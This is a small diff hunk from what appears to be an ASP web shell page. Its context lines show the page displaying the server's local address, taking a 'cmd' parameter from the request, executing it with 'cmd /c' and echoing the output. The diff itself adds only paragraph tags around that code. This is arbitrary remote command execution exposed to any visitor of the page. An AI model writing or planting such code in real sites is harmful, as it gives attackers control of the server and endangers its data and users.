@@ -41,6 +41,8 @@ end Function
 <p>
 <b>The server's local address:</b>
 <%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
+</p>
+<p>
 <% szCMD = request("cmd")
 thisDir = getCommandOutput("cmd /c" & szCMD)
 Response.Write(thisDir)%>
